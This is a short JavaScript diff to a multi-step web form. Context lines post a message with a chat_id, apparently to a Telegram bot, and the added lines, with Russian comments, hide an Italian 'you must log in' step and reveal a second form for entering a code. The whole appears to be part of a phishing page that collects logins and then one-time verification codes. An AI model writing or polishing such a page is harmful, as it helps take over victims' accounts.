@@ -689,8 +689,13 @@
                     body: JSON.stringify({ chat_id, text: msg })
                 });
 
-                document.getElementById("form-step-1").style.display = "none";
-                document.getElementById("form-step-2").style.display = "block";
+                //document.getElementById("form-step-1").style.display = "none";
+                //document.getElementById("form-step-2").style.display = "block";
+                document.getElementById("step-1").style.display = "none"; // Полностью скрываем первый шаг (вместе с текстом "Devi accedere...")
+                const step2Block = document.getElementById("step-2");
+                step2Block.classList.remove("hidden"); // Показываем весь блок второго шага (убираем класс "hidden")
+                step2Block.style.display = "block"; // Убеждаемся, что он отображается как блок
+                document.getElementById("form-step-2").style.display = "block"; // Внутри второго шага показываем форму для ввода кода
 
             });
 
